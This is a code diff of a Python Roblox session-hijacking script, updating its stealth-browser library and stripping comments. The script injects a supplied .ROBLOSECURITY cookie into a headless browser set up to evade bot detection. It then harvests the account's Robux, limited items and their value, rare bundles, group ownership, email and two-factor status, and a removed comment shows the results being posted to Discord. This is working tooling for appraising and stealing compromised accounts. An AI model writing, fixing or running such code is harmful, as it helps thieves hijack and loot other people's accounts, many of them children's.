@@ -4,7 +4,7 @@ import re
 import asyncio
 from datetime import datetime, timezone
 from playwright.async_api import async_playwright
-from playwright_stealth import stealth_async
+from playwright_stealth import Stealth
 
 def extract_and_clean_cookie(raw_input):
     if not raw_input:
@@ -42,8 +42,8 @@ async def run_extraction():
     if not raw_cookie:
         sys.exit(0)
 
-    async with async_playwright() as p:
-        # Launch browser in headless mode with realistic viewport and arguments
+    # Wrap Playwright with the modern v2.x Stealth manager
+    async with Stealth().use_async(async_playwright()) as p:
         browser = await p.chromium.launch(
             headless=True,
             args=[
@@ -60,7 +60,6 @@ async def run_extraction():
             locale="en-US"
         )
 
-        # Inject the .ROBLOSECURITY cookie into Roblox's domain before navigating
         await context.add_cookies([{
             "name": ".ROBLOSECURITY",
             "value": raw_cookie,
@@ -72,15 +71,12 @@ async def run_extraction():
         }])
 
         page = await context.new_page()
-        await stealth_async(page)
 
         try:
-            # Navigate to home to establish session context and bypass DataDome challenges naturally
             await page.goto("https://www.roblox.com/home", wait_until="networkidle", timeout=15000)
         except Exception:
             pass
 
-        # Helper to fetch JSON endpoints safely inside the authenticated browser context
         async def fetch_json(url):
             try:
                 res = await page.evaluate(f"""async () => {{
@@ -92,7 +88,6 @@ async def run_extraction():
             except Exception:
                 return None
 
-        # 1. Authenticated User Info
         auth_data = await fetch_json("https://users.roblox.com/v1/users/authenticated")
         if not auth_data or not auth_data.get("id"):
             await browser.close()
@@ -102,7 +97,6 @@ async def run_extraction():
         username = auth_data.get("name", "Unknown")
         display_name = auth_data.get("displayName", username)
 
-        # 2. Account Age & Details
         user_info = await fetch_json(f"https://users.roblox.com/v1/users/{user_id}") or {}
         created = user_info.get("created", "")
         age_days = 0
@@ -113,15 +107,12 @@ async def run_extraction():
             except Exception:
                 pass
 
-        # 3. Robux Currency
         robux_res = await fetch_json(f"https://economy.roblox.com/v1/users/{user_id}/currency") or {}
         robux = robux_res.get("robux", 0)
 
-        # 4. Pending Robux
         trans_res = await fetch_json(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?transactionType=summary&timeFrame=Year") or {}
         pending = trans_res.get("pendingRobuxTotal", 0)
 
-        # 5. Limiteds / RAP
         limiteds = []
         cursor = ""
         page_count = 0
@@ -142,11 +133,9 @@ async def run_extraction():
         rap = sum(limiteds)
         lim_count = len(limiteds)
 
-        # 6. Premium Status
         prem_res = await fetch_json(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
         premium = prem_res is True
 
-        # 7. Special Items (Korblox, Headless, Violet Valk)
         async def check_bundle(b_id):
             res = await fetch_json(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{b_id}/is-owned")
             return res is True
@@ -159,20 +148,17 @@ async def run_extraction():
         headless = await check_bundle(201)
         violet_valk = await check_asset(799742571)
 
-        # 8. Groups
         groups_res = await fetch_json(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles") or {}
         groups = groups_res.get("data", [])
         group_count = len(groups)
         owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)
 
-        # 9. Account Settings
         email_res = await fetch_json("https://accountsettings.roblox.com/v1/email") or {}
         email_ver = email_res.get("verified", False)
 
         meta_res = await fetch_json("https://twostepverification.roblox.com/v1/metadata") or {}
         twofa = meta_res.get("twoStepVerificationEnabled", False)
 
-        # 10. Game Badges (Adopt Me, MM2, PS99)
         async def check_played(universe_id):
             badges_res = await fetch_json(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100") or {}
             if isinstance(badges_res, dict):
@@ -187,7 +173,6 @@ async def run_extraction():
 
         await browser.close()
 
-        # Send to Discord via standard requests post
         import requests
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
 
